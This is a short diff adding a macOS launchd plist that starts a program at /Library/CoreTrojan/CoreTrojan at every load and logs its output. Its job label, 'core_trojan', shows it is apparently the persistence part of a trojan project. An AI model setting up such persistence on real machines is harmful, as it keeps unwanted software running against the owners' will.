@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<!-- basic -->
+	<key>Label</key>
+	<string>core_trojan</string>
+	<key>Program</key>
+	<string>/Library/CoreTrojan/CoreTrojan</string>
+	<key>RunAtLoad</key>
+	<true/>
+	
+	<!-- log -->
+	<key>StandardErrorPath</key>
+	<string>/Library/CoreTrojan/run.log</string>
+	<key>StandardOutPath</key>
+	<string>/Library/CoreTrojan/run.log</string>
+
+</dict>
+</plist>
+
